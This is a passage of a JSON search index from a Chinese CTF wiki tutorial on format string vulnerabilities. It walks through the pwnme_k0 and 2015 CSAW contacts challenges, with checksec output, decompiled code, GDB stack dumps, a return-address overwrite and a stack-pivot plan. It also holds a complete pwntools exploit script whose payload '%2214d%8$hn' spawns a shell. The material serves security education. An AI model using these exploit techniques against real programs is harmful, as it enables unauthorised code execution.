            "text": "\u8fd9\u91cc\u6211\u4eec\u4ee5\u4e09\u4e2a\u767d\u5e3d-pwnme_k0\u4e3a\u4f8b\u8fdb\u884c\u5206\u6790\u3002", 
            "title": "\u4f8b\u5b50"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_16", 
            "text": "\u279c  \u4e09\u4e2a\u767d\u5e3d-pwnme_k0 git: ( master )  \u2717 checksec pwnme_k0\n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x400000 )   \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e3b\u8981\u5f00\u542f\u4e86NX\u4fdd\u62a4\u4ee5\u53caFull RELRO\u4fdd\u62a4\u3002\u8fd9\u6211\u4eec\u5c31\u6ca1\u6709\u529e\u6cd5\u4fee\u6539\u7a0b\u5e8f\u7684got\u8868\u4e86\u3002", 
            "title": "\u786e\u5b9a\u4fdd\u62a4"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_17", 
            "text": "\u7b80\u5355\u5206\u6790\u4e00\u4e0b\uff0c\u5c31\u77e5\u9053\u7a0b\u5e8f\u4f3c\u4e4e\u4e3b\u8981\u5b9e\u73b0\u4e86\u4e00\u4e2a\u7c7b\u4f3c\u8d26\u6237\u6ce8\u518c\u4e4b\u7c7b\u7684\u529f\u80fd\uff0c\u4e3b\u8981\u6709\u4fee\u6539\u67e5\u770b\u529f\u80fd\uff0c\u7136\u540e\u53d1\u73b0\u5728\u67e5\u770b\u529f\u80fd\u4e2d\u53d1\u73b0\u4e86\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e  int   __usercall   sub_400B07 @ eax ( char   format @ dil ,   char   formata ,   __int64   a3 ,   char   a4 )  { \n   write ( 0 ,   Welc0me to sangebaimao! \\n ,   0x1AuLL ); \n   printf ( formata ,   Welc0me to sangebaimao! \\n ); \n   return   printf ( a4   +   4 );  }   \u5176\u8f93\u51fa\u7684\u5185\u5bb9\u4e3a a4+4\u3002\u6211\u4eec\u56de\u6eaf\u4e00\u4e0b\uff0c\u53d1\u73b0\u6211\u4eec\u8bfb\u5165\u7684passwrod\u5185\u5bb9\u4e5f\u662f       v6   =   read ( 0 ,   ( char   * ) a4   +   4 ,   0x14uLL );   \u5f53\u7136\u6211\u4eec\u8fd8\u53ef\u4ee5\u53d1\u73b0\u6211\u4eec\u8bfb\u5165\u7684username\u5728\u8ddd\u79bb\u7684password20\u4e2a\u5b57\u8282\u3002     puts ( Input your username(max lenth:20):  ); \n   fflush ( stdout ); \n   v8   =   read ( 0 ,   bufa ,   0x14uLL ); \n   if   (   v8     v8   =   0x14u   ) \n   { \n     puts ( Input your password(max lenth:20):  ); \n     fflush ( stdout ); \n     v6   =   read ( 0 ,   ( char   * ) a4   +   4 ,   0x14uLL ); \n     fflush ( stdout ); \n     * ( _QWORD   * ) buf   =   bufa ; \n     * ( _QWORD   * )( buf   +   8 )   =   a3 ; \n     * ( _QWORD   * )( buf   +   16 )   =   a4 ;   \u597d\uff0c\u8fd9\u5c31\u5dee\u4e0d\u591a\u4e86\u3002\u6b64\u5916\uff0c\u4e5f\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e2a\u8d26\u53f7\u5bc6\u7801\u5176\u5b9e\u6ca1\u5565\u914d\u5bf9\u4e0d\u914d\u5bf9\u7684\u3002", 
            "title": "\u5206\u6790\u7a0b\u5e8f"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_18", 
            "text": "\u6211\u4eec\u6700\u7ec8\u7684\u76ee\u7684\u662f\u5e0c\u671b\u53ef\u4ee5\u83b7\u5f97\u7cfb\u7edf\u7684shell\uff0c\u53ef\u4ee5\u53d1\u73b0\u5728\u7ed9\u5b9a\u7684\u6587\u4ef6\u4e2d\uff0c\u572800000000004008A6\u5730\u5740\u5904\u6709\u4e00\u4e2a\u76f4\u63a5\u8c03\u7528system('bin/sh')\u7684\u51fd\u6570\uff08\u5173\u4e8e\u8fd9\u4e2a\u7684\u53d1\u73b0\uff0c\u4e00\u822c\u90fd\u4f1a\u73b0\u5728\u7a0b\u5e8f\u5927\u81f4\u770b\u4e00\u4e0b\u3002\uff09\u3002\u90a3\u5982\u679c\u6211\u4eec\u4fee\u6539\u67d0\u4e2a\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u4e3a\u8fd9\u4e2a\u5730\u5740\uff0c\u90a3\u5c31\u76f8\u5f53\u4e8e\u83b7\u5f97\u4e86shell\u3002  \u867d\u7136\u5b58\u50a8\u8fd4\u56de\u5730\u5740\u7684\u5185\u5b58\u672c\u8eab\u662f\u52a8\u6001\u53d8\u5316\u7684\uff0c\u4f46\u662f\u5176\u76f8\u5bf9\u4e8erbp\u7684\u5730\u5740\u5e76\u4e0d\u4f1a\u6539\u53d8\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u76f8\u5bf9\u5730\u5740\u6765\u8ba1\u7b97\u3002\u5229\u7528\u601d\u8def\u5982\u4e0b   \u786e\u5b9a\u504f\u79fb  \u83b7\u53d6\u51fd\u6570\u7684rbp\u4e0e\u8fd4\u56de\u5730\u5740  \u6839\u636e\u76f8\u5bf9\u504f\u79fb\u83b7\u53d6\u5b58\u50a8\u8fd4\u56de\u5730\u5740\u7684\u5730\u5740  \u5c06\u6267\u884csystem\u51fd\u6570\u8c03\u7528\u7684\u5730\u5740\u5199\u5165\u5230\u5b58\u50a8\u8fd4\u56de\u5730\u5740\u7684\u5730\u5740\u3002", 
            "title": "\u5229\u7528\u601d\u8def"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_19", 
            "text": "\u9996\u5148\uff0c\u6211\u4eec\u5148\u6765\u786e\u5b9a\u4e00\u4e0b\u504f\u79fb\u3002\u8f93\u5165\u7528\u6237\u540daaaaaaaa\uff0c\u5bc6\u7801\u968f\u4fbf\u8f93\u5165\uff0c\u65ad\u70b9\u4e0b\u5728\u8f93\u51fa\u5bc6\u7801\u7684\u90a3\u4e2aprintf( a4 + 4)\u51fd\u6570\u5904  Register Account first!\nInput your username(max lenth:20): \naaaaaaaa\nInput your password(max lenth:20): \n%p%p%p%p%p%p%p%p%p%p\nRegister Success!!\n1.Sh0w Account Infomation!\n2.Ed1t Account Inf0mation!\n3.QUit sangebaimao:( error options\n1.Sh0w Account Infomation!\n2.Ed1t Account Inf0mation!\n3.QUit sangebaimao:( 1\n...  \u6b64\u65f6\u6808\u7684\u60c5\u51b5\u4e3a  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ code:i386:x86-64 ]\u2500\u2500\u2500\u2500\n     0x400b1a                  call   0x400758\n     0x400b1f                  lea    rdi, [rbp+0x10]\n     0x400b23                  mov    eax, 0x0\n \u2192   0x400b28                  call   0x400770\n   \u21b3    0x400770                  jmp    QWORD PTR [rip+0x20184a]        # 0x601fc0\n        0x400776                  xchg   ax, ax\n        0x400778                  jmp    QWORD PTR [rip+0x20184a]        # 0x601fc8\n        0x40077e                  xchg   ax, ax\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ stack ]\u2500\u2500\u2500\u2500\n0x00007fffffffdb40\u2502+0x00: 0x00007fffffffdb80  \u2192  0x00007fffffffdc30  \u2192  0x0000000000400eb0  \u2192   push r15     \u2190 $rsp, $rbp\n0x00007fffffffdb48\u2502+0x08: 0x0000000000400d74  \u2192   add rsp, 0x30\n0x00007fffffffdb50\u2502+0x10:  aaaaaaaa      \u2190 $rdi\n0x00007fffffffdb58\u2502+0x18: 0x000000000000000a\n0x00007fffffffdb60\u2502+0x20: 0x7025702500000000\n0x00007fffffffdb68\u2502+0x28:  %p%p%p%p%p%p%p%pM\\r@ \n0x00007fffffffdb70\u2502+0x30:  %p%p%p%pM\\r@ \n0x00007fffffffdb78\u2502+0x38: 0x0000000000400d4d  \u2192   cmp eax, 0x2  \u53ef\u4ee5\u53d1\u73b0\u6211\u4eec\u8f93\u5165\u7684\u7528\u6237\u540d\u5728\u6808\u4e0a\u7b2c\u4e09\u4e2a\u4f4d\u7f6e\uff0c\u90a3\u4e48\u9664\u53bb\u672c\u8eab\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u4f4d\u7f6e\uff0c\u5176\u504f\u79fb\u4e3a\u4e3a5+3=8\u3002", 
            "title": "\u786e\u5b9a\u504f\u79fb"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_20", 
            "text": "\u6211\u4eec\u518d\u4ed4\u7ec6\u89c2\u5bdf\u4e0b\u65ad\u70b9\u5904\u6808\u7684\u4fe1\u606f  0x00007fffffffdb40\u2502+0x00: 0x00007fffffffdb80  \u2192  0x00007fffffffdc30  \u2192  0x0000000000400eb0  \u2192   push r15     \u2190 $rsp, $rbp\n0x00007fffffffdb48\u2502+0x08: 0x0000000000400d74  \u2192   add rsp, 0x30\n0x00007fffffffdb50\u2502+0x10:  aaaaaaaa      \u2190 $rdi\n0x00007fffffffdb58\u2502+0x18: 0x000000000000000a\n0x00007fffffffdb60\u2502+0x20: 0x7025702500000000\n0x00007fffffffdb68\u2502+0x28:  %p%p%p%p%p%p%p%pM\\r@ \n0x00007fffffffdb70\u2502+0x30:  %p%p%p%pM\\r@ \n0x00007fffffffdb78\u2502+0x38: 0x0000000000400d4d  \u2192   cmp eax, 0x2  \u53ef\u4ee5\u770b\u5230\u6808\u4e0a\u7b2c\u4e8c\u4e2a\u4f4d\u7f6e\u5b58\u50a8\u7684\u5c31\u662f\u8be5\u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740(\u5176\u5b9e\u4e5f\u5c31\u662f\u8c03\u7528showaccounth\u51fd\u6570\u65f6\u6267\u884cpush rip\u6240\u5b58\u50a8\u7684\u503c)\uff0c\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4e2d\u7684\u504f\u79fb\u4e3a7\u3002  \u4e0e\u6b64\u540c\u65f6\u6808\u4e0a\uff0c\u7b2c\u4e00\u4e2a\u5143\u7d20\u5b58\u50a8\u7684\u4e5f\u5c31\u662f\u4e0a\u4e00\u4e2a\u51fd\u6570\u7684rbp\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5f97\u5230\u504f\u79fb0x00007fffffffdb80-0x00007fffffffdb48=0x38\u3002\u7ee7\u800c\u5982\u679c\u6211\u4eec\u77e5\u9053\u4e86rbp\u7684\u6570\u503c\uff0c\u5c31\u77e5\u9053\u4e86\u51fd\u6570\u8fd4\u56de\u5730\u5740\u7684\u5730\u5740\u3002  0x0000000000400d74\u4e0e0x00000000004008A6\u53ea\u6709\u4f4e2\u5b57\u8282\u4e0d\u540c\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u53ea\u4fee\u65390x00007fffffffdb48\u5f00\u59cb\u76842\u4e2a\u5b57\u8282\u3002", 
            "title": "\u4fee\u6539\u5730\u5740"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_21", 
            "text": "\u8fd9\u91cc\u4f7f\u7528data[1:]\u7684\u539f\u56e0\u662f\u5f53\u6211\u4eecsplit\u7684\u65f6\u5019\u7531\u4e8e\u8d77\u59cb\u7684\u662f0x\uff0c\u6240\u4ee5\u4f1a\u4ea7\u751f\u2018\u2019\u5b57\u7b26\u4e32\uff0c\u9700\u8981\u8df3\u8fc7\u3002  from   pwn   import   *  from   LibcSearcher   import   *  pwnme   =   ELF ( ./pwnme_k0 )  if   args [ REMOTE ]: \n     sh   =   remote ( 11 ,   11 )  else : \n     sh   =   process ( ./pwnme_k0 )  sh . recvuntil ( : \\n )  sh . sendline ( a   *   8 )  sh . recvuntil ( : \\n )  sh . sendline ( %p   *   9 )  sh . recvuntil ( )  sh . sendline ( 1 )  sh . recvuntil ( a   *   8   +   \\n )  data   =   sh . recvuntil ( 1. ,   drop = True ) . split ( 0x )  print   data  data   =   data [ 1 :]  rbp   =   int ( data [ 5 ],   16 )  ret_addr   =   rbp   -   0x38  sh . recvuntil ( )  sh . sendline ( 2 )  sh . recvuntil ( : \\n )  sh . sendline ( p64 ( ret_addr ))  sh . recvuntil ( : \\n )  payload   =   %2214d %8$hn  sh . sendline ( payload )  sh . recvuntil ( )  sh . sendline ( 1 )  sh . interactive ()", 
            "title": "\u5229\u7528\u7a0b\u5e8f"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_22", 
            "text": "", 
            "title": "\u5806\u4e0a\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_23", 
            "text": "\u6240\u8c13\u5806\u4e0a\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6307\u7684\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u672c\u8eab\u5b58\u50a8\u5728\u5806\u4e0a\uff0c\u8fd9\u4e2a\u4e3b\u8981\u589e\u52a0\u4e86\u6211\u4eec\u83b7\u53d6\u5bf9\u5e94\u504f\u79fb\u7684\u96be\u5ea6\uff0c\u800c\u4e00\u822c\u6765\u8bf4\uff0c\u8be5\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u90fd\u662f\u5f88\u6709\u53ef\u80fd\u88ab\u590d\u5236\u5230\u6808\u4e0a\u7684\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_24", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u4ee52015\u5e74CSAW\u4e2d\u7684contacts\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002", 
            "title": "\u4f8b\u5b50"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_25", 
            "text": "\u279c   2015 -CSAW-contacts git: ( master )  \u2717 checksec contacts\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE  ( 0x8048000 )   \u53ef\u4ee5\u770b\u51fa\u7a0b\u5e8f\u4e0d\u4ec5\u5f00\u542f\u4e86NX\u4fdd\u62a4\u8fd8\u5f00\u542f\u4e86Canary\u3002", 
            "title": "\u786e\u5b9a\u4fdd\u62a4"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_26", 
            "text": "\u7b80\u5355\u770b\u770b\u7a0b\u5e8f\uff0c\u53d1\u73b0\u7a0b\u5e8f\u6b63\u5982\u540d\u5b57\u6240\u63cf\u8ff0\u7684\uff0c\u662f\u4e00\u4e2a\u8054\u7cfb\u4eba\u76f8\u5173\u7684\u7a0b\u5e8f\uff0c\u53ef\u4ee5\u5b9e\u73b0\u521b\u5efa\uff0c\u4fee\u6539\uff0c\u5220\u9664\uff0c\u6253\u5370\u8054\u7cfb\u4eba\u7684\u4fe1\u606f\u3002\u800c\u518d\u4ed4\u7ec6\u9605\u8bfb\uff0c\u53ef\u4ee5\u53d1\u73b0\u5728\u8f93\u5165\u8054\u7cfb\u4eba\u4fe1\u606f\u7684\u65f6\u5019\u5b58\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u3002  int   __cdecl   PrintInfo ( int   a1 ,   int   a2 ,   int   a3 ,   char   * format )  { \n   printf ( \\t Name: %s \\n ,   a1 ); \n   printf ( \\t Length %u \\n ,   a2 ); \n   printf ( \\t Phone #: %s \\n ,   a3 ); \n   printf ( \\t Description:  ); \n   return   printf ( format );  }   \u4ed4\u7ec6\u770b\u770b\uff0c\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e2aformat\u5176\u5b9e\u662f\u6307\u5411\u5806\u4e2d\u7684\u3002", 
            "title": "\u5206\u6790\u7a0b\u5e8f"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_27", 
            "text": "\u6211\u4eec\u7684\u57fa\u672c\u76ee\u7684\u662f\u83b7\u53d6\u7cfb\u7edf\u7684shell\uff0c\u4ece\u800c\u62ff\u5230flag\u3002\u5176\u5b9e\u65e2\u7136\u6709\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u6211\u4eec\u5e94\u8be5\u662f\u53ef\u4ee5\u901a\u8fc7\u52ab\u6301got\u8868\u6216\u8005\u63a7\u5236\u7a0b\u5e8f\u8fd4\u56de\u5730\u5740\u6765\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\u3002\u4f46\u662f\u8fd9\u91cc\u5374\u4e0d\u600e\u4e48\u53ef\u884c\u3002\u539f\u56e0\u5206\u522b\u5982\u4e0b   \u4e4b\u6240\u4ee5\u4e0d\u80fd\u591f\u52ab\u6301got\u6765\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\uff0c\u662f\u56e0\u4e3a\u6211\u4eec\u53d1\u73b0\u5bf9\u4e8e\u7a0b\u5e8f\u4e2d\u5e38\u89c1\u7684\u53ef\u4ee5\u5bf9\u4e8e\u6211\u4eec\u7ed9\u5b9a\u7684\u5b57\u7b26\u4e32\u8f93\u51fa\u7684\u53ea\u6709printf\u51fd\u6570\uff0c\u6211\u4eec\u53ea\u6709\u9009\u62e9\u5b83\u624d\u53ef\u4ee5\u6784\u9020/bin/sh\u8ba9\u5b83\u6267\u884csystem('/bin/sh')\uff0c\u4f46\u662fprintf\u51fd\u6570\u5728\u5176\u4ed6\u5730\u65b9\u4e5f\u5747\u6709\u7528\u5230\uff0c\u8fd9\u6837\u505a\u4f1a\u4f7f\u5f97\u7a0b\u5e8f\u76f4\u63a5\u5d29\u6e83\u3002  \u5176\u6b21\uff0c\u4e0d\u80fd\u591f\u76f4\u63a5\u63a7\u5236\u7a0b\u5e8f\u8fd4\u56de\u5730\u5740\u6765\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b\u7684\u662f\u56e0\u4e3a\u6211\u4eec\u5e76\u6ca1\u6709\u4e00\u5757\u53ef\u4ee5\u76f4\u63a5\u6267\u884c\u7684\u5730\u5740\u6765\u5b58\u50a8\u6211\u4eec\u7684\u5185\u5bb9\uff0c\u540c\u65f6\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6765\u5f80\u6808\u4e0a\u76f4\u63a5\u5199\u5165system_addr+'bbbb'+addr of '/bin/sh\u2018\u4f3c\u4e4e\u5e76\u4e0d\u73b0\u5b9e\u3002   \u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u600e\u4e48\u505a\u5462\uff1f\u6211\u4eec\u8fd8\u6709\u4e4b\u524d\u5728\u6808\u6ea2\u51fa\u8bb2\u7684\u6280\u5de7\uff0cstack pivoting\u3002\u800c\u8fd9\u91cc\uff0c\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u7684\u6070\u597d\u662f\u5806\u5185\u5b58\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u628a\u6808\u8fc1\u79fb\u5230\u5806\u4e0a\u53bb\u3002\u8fd9\u91cc\u6211\u4eec\u901a\u8fc7leave\u6307\u4ee4\u6765\u8fdb\u884c\u6808\u8fc1\u79fb\uff0c\u6240\u4ee5\u5728\u8fc1\u79fb\u4e4b\u524d\u6211\u4eec\u9700\u8981\u4fee\u6539\u7a0b\u5e8f\u4fdd\u5b58ebp\u7684\u503c\u4e3a\u6211\u4eec\u60f3\u8981\u7684\u503c\u3002 \u53ea\u6709\u8fd9\u6837\u5728\u6267\u884cleave\u6307\u4ee4\u7684\u65f6\u5019\uff0cesp\u624d\u4f1a\u6210\u4e3a\u6211\u4eec\u60f3\u8981\u7684\u503c\u3002\u540c\u65f6\uff0c\u56e0\u4e3a\u6211\u4eec\u662f\u4f7f\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6765\u8fdb\u884c\u4fee\u6539\uff0c\u6240\u4ee5\u6211\u4eec\u5f97\u77e5\u9053\u4fdd\u5b58ebp\u7684\u5730\u5740\u4e3a\u591a\u5c11\uff0c\u800c\u8fd9\u65f6PrintInfo\u51fd\u6570\u4e2d\u5b58\u50a8ebp\u7684\u5730\u5740\u6bcf\u6b21\u90fd\u5728\u53d8\u5316\uff0c\u800c\u6211\u4eec\u4e5f\u65e0\u6cd5\u901a\u8fc7\u5176\u4ed6\u65b9\u6cd5\u5f97\u77e5\u3002\u4f46\u662f\uff0c \u7a0b\u5e8f\u4e2d\u538b\u5165\u6808\u4e2d\u7684ebp\u503c\u5176\u5b9e\u4fdd\u5b58\u7684\u662f\u4e0a\u4e00\u4e2a\u51fd\u6570\u7684\u4fdd\u5b58ebp\u503c\u7684\u5730\u5740 \uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4fee\u6539\u5176 \u4e0a\u5c42\u51fd\u6570\u7684\u4fdd\u5b58\u7684ebp\u7684\u503c\uff0c\u5373\u4e0a\u4e0a\u5c42\u51fd\u6570\uff08\u5373main\u51fd\u6570\uff09\u7684ebp\u6570\u503c \u3002\u8fd9\u6837\u5f53\u4e0a\u5c42\u7a0b\u5e8f\u8fd4\u56de\u65f6\uff0c\u5373\u5b9e\u73b0\u4e86\u5c06\u6808\u8fc1\u79fb\u5230\u5806\u7684\u64cd\u4f5c\u3002  \u57fa\u672c\u601d\u8def\u5982\u4e0b   \u9996\u5148\u83b7\u53d6system\u51fd\u6570\u7684\u5730\u5740  \u901a\u8fc7\u6cc4\u9732\u67d0\u4e2alibc\u51fd\u6570\u7684\u5730\u5740\u6839\u636elibc database\u786e\u5b9a\u3002    \u6784\u9020\u57fa\u672c\u8054\u7cfb\u4eba\u63cf\u8ff0\u4e3asystem_addr+'bbbb'+binsh_addr  \u4fee\u6539\u4e0a\u5c42\u51fd\u6570\u4fdd\u5b58\u7684ebp(\u5373\u4e0a\u4e0a\u5c42\u51fd\u6570\u7684ebp)\u4e3a \u5b58\u50a8system_addr\u7684\u5730\u5740-4 \u3002  \u5f53\u4e3b\u7a0b\u5e8f\u8fd4\u56de\u65f6\uff0c\u4f1a\u6709\u5982\u4e0b\u64cd\u4f5c  move esp,ebp\uff0c\u5c06esp\u6307\u5411system_addr\u7684\u5730\u5740-4  pop ebp\uff0c \u5c06esp\u6307\u5411system_addr  ret\uff0c\u5c06eip\u6307\u5411system_addr\uff0c\u4ece\u800c\u83b7\u53d6shell\u3002", 
            "title": "\u5229\u7528\u601d\u8def"
        }, 
        {
            "location": "/pwn/fmtstr/fmtstr_example/#_28", 
            "text": "\u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u662f\u83b7\u53d6system\u51fd\u6570\u5730\u5740\u3001/bin/sh\u5730\u5740\uff0c\u6808\u4e0a\u5b58\u50a8\u8054\u7cfb\u4eba\u63cf\u8ff0\u7684\u5730\u5740\uff0c\u4ee5\u53caPrintInfo\u51fd\u6570\u7684\u5730\u5740\u3002  \u9996\u5148\uff0c\u6211\u4eec\u6839\u636e\u6808\u4e0a\u5b58\u50a8\u7684libc_start_main_ret\u5730\u5740(\u8be5\u5730\u5740\u662f\u5f53main\u51fd\u6570\u6267\u884c\u8fd4\u56de\u65f6\u4f1a\u8fd0\u884c\u7684\u51fd\u6570)\u6765\u83b7\u53d6system\u51fd\u6570\u5730\u5740\u3001/bin/sh\u5730\u5740\u3002\u6211\u4eec\u6784\u9020\u76f8\u5e94\u7684\u8054\u7cfb\u4eba\uff0c\u7136\u540e\u9009\u62e9\u8f93\u51fa\u8054\u7cfb\u4eba\u4fe1\u606f\uff0c\u5e76\u5c06\u65ad\u70b9\u4e0b\u5728printf\u5904\uff0c\u5e76\u4e14\u4e00\u76f4\u8fd0\u884c\u5230\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684printf\u51fd\u6570\u5904\uff0c\u5982\u4e0b   \u2192 0xf7e44670  printf+0        call   0xf7f1ab09  __x86.get_pc_thunk.ax \n   \u21b3  0xf7f1ab09  __x86.get_pc_thunk.ax+0  mov    eax, DWORD PTR  [ esp ] \n      0xf7f1ab0c  __x86.get_pc_thunk.ax+3  ret    \n      0xf7f1ab0d  __x86.get_pc_thunk.dx+0  mov    edx, DWORD PTR  [ esp ] \n      0xf7f1ab10  __x86.get_pc_thunk.dx+3  ret    \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [  stack  ] \u2500\u2500\u2500\u2500 [ 0xffffccfc ,  l8 ]  8 \n0xffffccfc\u2502+0x00: 0x08048c27  \u2192   leave      \u2190  $esp \n0xffffcd00\u2502+0x04: 0x0804c420  \u2192   1234567 \n0xffffcd04\u2502+0x08: 0x0804c410  \u2192   11111 \n0xffffcd08\u2502+0x0c: 0xf7e5acab  \u2192   puts+11  add ebx, 0x152355\n0xffffcd0c\u2502+0x10: 0x00000000\n0xffffcd10\u2502+0x14: 0xf7fad000  \u2192  0x001b1db0\n0xffffcd14\u2502+0x18: 0xf7fad000  \u2192  0x001b1db0\n0xffffcd18\u2502+0x1c: 0xffffcd48  \u2192  0xffffcd78  \u2192  0x00000000   \u2190  $ebp \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 [  trace  ] \u2500\u2500\u2500\u2500 [ #0] 0xf7e44670 \u2192 Name: __printf(format=0x804c420  1234567\\n )  [ #1] 0x8048c27 \u2192 leave   [ #2] 0x8048c99 \u2192 add DWORD PTR [ebp-0xc], 0x1  [ #3] 0x80487a2 \u2192 jmp 0x80487b3  [ #4] 0xf7e13637 \u2192 Name: __libc_start_main(main=0x80486bd, argc=0x1, argv=0xffffce14, init=0x8048df0, fini=0x8048e60, rtld_fini=0xf7fe88a0  _dl_fini , stack_end=0xffffce0c)  [ #5] 0x80485e1 \u2192 hlt  \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\ngef\u27a4  dereference  $esp   140  [ $esp ,  140 ]  1 \n0xffffccfc\u2502+0x00: 0x08048c27  \u2192   leave      \u2190  $esp \ngef\u27a4  dereference  $esp  l140 [ $esp ,  l140 ]  140 \n0xffffccfc\u2502+0x00: 0x08048c27  \u2192   leave      \u2190  $esp \n0xffffcd00\u2502+0x04: 0x0804c420  \u2192   1234567 \n0xffffcd04\u2502+0x08: 0x0804c410  \u2192   11111 \n0xffffcd08\u2502+0x0c: 0xf7e5acab  \u2192   puts+11  add ebx, 0x152355\n0xffffcd0c\u2502+0x10: 0x00000000\n0xffffcd10\u2502+0x14: 0xf7fad000  \u2192  0x001b1db0\n0xffffcd14\u2502+0x18: 0xf7fad000  \u2192  0x001b1db0\n0xffffcd18\u2502+0x1c: 0xffffcd48  \u2192  0xffffcd78  \u2192  0x00000000   \u2190  $ebp \n0xffffcd1c\u2502+0x20: 0x08048c99  \u2192   add DWORD PTR  [ ebp-0xc ] , 0x1\n0xffffcd20\u2502+0x24: 0x0804b0a8  \u2192   11111 \n0xffffcd24\u2502+0x28: 0x00002b67  ( g+ ? ) \n0xffffcd28\u2502+0x2c: 0x0804c410  